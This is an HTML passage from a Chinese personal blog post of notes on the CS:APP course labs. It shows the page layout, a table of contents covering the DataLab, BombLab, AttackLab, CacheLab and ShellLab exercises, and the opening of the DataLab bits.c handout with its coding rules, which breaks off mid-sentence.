<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
  </script>

  <meta name="description" content="实验记录及感悟">
<meta property="og:type" content="article">
<meta property="og:title" content="CSAPP-Labs">
<meta property="og:url" content="http://example.com/2021/04/05/CSAPP-Labs/index.html">
<meta property="og:site_name" content="FEZ的博客">
<meta property="og:description" content="实验记录及感悟">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2021/04/05/CSAPP-Labs/bomblab_tree.png">
<meta property="og:image" content="http://example.com/2021/04/05/CSAPP-Labs/attacklab_1.jpg">
<meta property="og:image" content="http://example.com/2021/04/05/CSAPP-Labs/attacklab_2.jpg">
<meta property="og:image" content="http://example.com/2021/04/05/CSAPP-Labs/cachelab_1.jpg">
<meta property="article:published_time" content="2021-04-05T13:52:15.000Z">
<meta property="article:modified_time" content="2021-08-31T01:25:09.719Z">
<meta property="article:author" content="FEZ">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2021/04/05/CSAPP-Labs/bomblab_tree.png">


<link rel="canonical" href="http://example.com/2021/04/05/CSAPP-Labs/">


<script class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>CSAPP-Labs | FEZ的博客</title>
  


  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?7035c3f4ba1040e0d1972d11a3943ebb";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">FEZ的博客</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <section class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DataLab"><span class="nav-number">1.</span> <span class="nav-text">DataLab</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E5%86%85%E5%AE%B9"><span class="nav-number">1.1.</span> <span class="nav-text">实验内容</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%84%9F%E6%82%9F"><span class="nav-number">1.2.</span> <span class="nav-text">感悟</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BombLab"><span class="nav-number">2.</span> <span class="nav-text">BombLab</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#phase-1"><span class="nav-number">2.1.</span> <span class="nav-text">phase_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phase-2"><span class="nav-number">2.2.</span> <span class="nav-text">phase_2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phase-3"><span class="nav-number">2.3.</span> <span class="nav-text">phase_3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phase-4"><span class="nav-number">2.4.</span> <span class="nav-text">phase_4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phase-5"><span class="nav-number">2.5.</span> <span class="nav-text">phase_5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phase-6"><span class="nav-number">2.6.</span> <span class="nav-text">phase_6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#secret-phase"><span class="nav-number">2.7.</span> <span class="nav-text">secret_phase</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ArchitectureLab"><span class="nav-number">3.</span> <span class="nav-text">ArchitectureLab</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%86%E5%A4%87"><span class="nav-number">3.1.</span> <span class="nav-text">准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Part-A"><span class="nav-number">3.2.</span> <span class="nav-text">Part A</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sum-ys"><span class="nav-number">3.2.1.</span> <span class="nav-text">sum.ys</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rsum-ys"><span class="nav-number">3.2.2.</span> <span class="nav-text">rsum.ys</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#copy-ys"><span class="nav-number">3.2.3.</span> <span class="nav-text">copy.ys</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Part-B"><span class="nav-number">3.3.</span> <span class="nav-text">Part B</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Part-C"><span class="nav-number">3.4.</span> <span class="nav-text">Part C</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">3.5.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#AttackLab"><span class="nav-number">4.</span> <span class="nav-text">AttackLab</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-1"><span class="nav-number">4.1.</span> <span class="nav-text">Level 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-2"><span class="nav-number">4.2.</span> <span class="nav-text">Level 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-3"><span class="nav-number">4.3.</span> <span class="nav-text">Level 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-2-1"><span class="nav-number">4.4.</span> <span class="nav-text">Level 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-3-1"><span class="nav-number">4.5.</span> <span class="nav-text">Level 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93-1"><span class="nav-number">4.6.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CacheLab"><span class="nav-number">5.</span> <span class="nav-text">CacheLab</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Part-A-1"><span class="nav-number">5.1.</span> <span class="nav-text">Part A</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Part-B-1"><span class="nav-number">5.2.</span> <span class="nav-text">Part B</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#32-x-32"><span class="nav-number">5.2.1.</span> <span class="nav-text">32 x 32</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#64-x-64"><span class="nav-number">5.2.2.</span> <span class="nav-text">64 x 64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#61-x-67"><span class="nav-number">5.2.3.</span> <span class="nav-text">61 x 67</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%80%E7%BB%88%E7%BB%93%E6%9E%9C"><span class="nav-number">5.2.4.</span> <span class="nav-text">最终结果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93-2"><span class="nav-number">5.3.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PerformanceLab"><span class="nav-number">6.</span> <span class="nav-text">PerformanceLab</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ShellLab"><span class="nav-number">7.</span> <span class="nav-text">ShellLab</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#trace01"><span class="nav-number">7.1.</span> <span class="nav-text">trace01</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#trace02"><span class="nav-number">7.2.</span> <span class="nav-text">trace02</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#trace03"><span class="nav-number">7.3.</span> <span class="nav-text">trace03</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#trace04"><span class="nav-number">7.4.</span> <span class="nav-text">trace04</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#trace05"><span class="nav-number">7.5.</span> <span class="nav-text">trace05</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#trace06"><span class="nav-number">7.6.</span> <span class="nav-text">trace06</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#trace07"><span class="nav-number">7.7.</span> <span class="nav-text">trace07</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#trace08"><span class="nav-number">7.8.</span> <span class="nav-text">trace08</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#trace09-amp-trace10"><span class="nav-number">7.9.</span> <span class="nav-text">trace09 &amp; trace10</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#trace11-amp-trace-12"><span class="nav-number">7.10.</span> <span class="nav-text">trace11 &amp; trace 12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#trace13-amp-trace-14-amp-trace15-amp-trace16"><span class="nav-number">7.11.</span> <span class="nav-text">trace13 &amp; trace 14 &amp; trace15 &amp; trace16</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81"><span class="nav-number">7.12.</span> <span class="nav-text">完整代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93-3"><span class="nav-number">7.13.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MallocLab-amp-ProxyLab"><span class="nav-number">8.</span> <span class="nav-text">MallocLab &amp; ProxyLab</span></a></li></ol></div>
        </section>
        <!--/noindex-->

        <section class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="FEZ"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">FEZ</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">27</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



        </section>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">
      

      

  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/05/CSAPP-Labs/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="FEZ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="FEZ的博客">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CSAPP-Labs
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-04-05 21:52:15" itemprop="dateCreated datePublished" datetime="2021-04-05T21:52:15+08:00">2021-04-05</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2021-08-31 09:25:09" itemprop="dateModified" datetime="2021-08-31T09:25:09+08:00">2021-08-31</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">学习</span></a>
        </span>
    </span>

  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>94k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>1:26</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <p>实验记录及感悟</p>
<a id="more"></a>

<h1 id="DataLab"><a href="#DataLab" class="headerlink" title="DataLab"></a>DataLab</h1><h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * CS:APP Data Lab </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * &lt;Please put your name and userid here&gt;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * bits.c - Source file with your solutions to the Lab.</span></span><br><span class="line"><span class="comment"> *          This is the file you will hand in to your instructor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * WARNING: Do not include the &lt;stdio.h&gt; header; it confuses the dlc</span></span><br><span class="line"><span class="comment"> * compiler. You can still use printf for debugging without including</span></span><br><span class="line"><span class="comment"> * &lt;stdio.h&gt;, although you might get a compiler warning. In general,</span></span><br><span class="line"><span class="comment"> * it&#x27;s not good practice to ignore compiler warnings, but in this</span></span><br><span class="line"><span class="comment"> * case it&#x27;s OK.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Instructions to Students:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * STEP 1: Read the following instructions carefully.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">You will provide your solution to the Data Lab by</span><br><span class="line">editing the collection of functions in <span class="keyword">this</span> source file.</span><br><span class="line"></span><br><span class="line">INTEGER CODING RULES:</span><br><span class="line"> </span><br><span class="line">  Replace the <span class="string">&quot;return&quot;</span> statement in each function with one</span><br><span class="line">  <span class="keyword">or</span> more lines of C code that implements the function. Your code </span><br><span class="line">  must conform to the following style:</span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">Funct</span><span class="params">(arg1, arg2, ...)</span> </span>&#123;</span><br><span class="line">      <span class="comment">/* brief description of how your implementation works */</span></span><br><span class="line">      <span class="keyword">int</span> var1 = Expr1;</span><br><span class="line">      ...</span><br><span class="line">      <span class="keyword">int</span> varM = ExprM;</span><br><span class="line"></span><br><span class="line">      varJ = ExprJ;</span><br><span class="line">      ...</span><br><span class="line">      varN = ExprN;</span><br><span class="line">      <span class="keyword">return</span> ExprR;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Each <span class="string">&quot;Expr&quot;</span> is an expression <span class="keyword">using</span> ONLY the following:</span><br><span class="line">  <span class="number">1.</span> Integer constants <span class="number">0</span> through <span class="number">255</span> (<span class="number">0xFF</span>), inclusive. You are</span><br><span class="line">      <span class="keyword">not</span> allowed to use big constants such as <span class="number">0xffffffff</span>.</span><br><span class="line">  2. Function arguments and local variables (no global variables).</span><br><span class="line">  <span class="number">3.</span> Unary integer operations ! ~</span><br><span class="line">  <span class="number">4.</span> Binary integer operations &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="line">    </span><br><span class="line">  Some of the problems <span class="keyword">restrict</span> the <span class="built_in">set</span> of allowed operators even further.</span><br><span class="line">  Each <span class="string">&quot;Expr&quot;</span> may consist of multiple operators. You are <span class="keyword">not</span> restricted to</span><br><span class="line">  one <span class="keyword">operator</span> per line.</span><br><span class="line"></span><br><span class="line">  You are expressly forbidden to:</span><br><span class="line">  <span class="number">1.</span> Use any control constructs such as <span class="keyword">if</span>, <span class="keyword">do</span>, <span class="keyword">while</span>, <span class="keyword">for</span>, <span class="keyword">switch</span>, etc.</span><br><span class="line">  <span class="number">2.</span> Define <span class="keyword">or</span> use any macros.</span><br><span class="line">  <span class="number">3.</span> Define any additional functions in <span class="keyword">this</span> file.</span><br><span class="line">  <span class="number">4.</span> Call any functions.</span><br><span class="line">  <span class="number">5.</span> Use any other operations, such as &amp;&amp;, ||, -, <span class="keyword">or</span> ?:</span><br><span class="line">  <span class="number">6.</span> Use any form of casting.</span><br><span class="line">  <span class="number">7.</span> Use any data type other than <span class="keyword">int</span>.  This implies that you</span><br><span class="line">     cannot use arrays, structs, <span class="keyword">or</span> unions.</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  You may assume that your machine:</span><br><span class="line">  <span class="number">1.</span> Uses <span class="number">2</span>s complement, <span class="number">32</span>-bit representations of integers.</span><br><span class="line">  <span class="number">2.</span> Performs right shifts 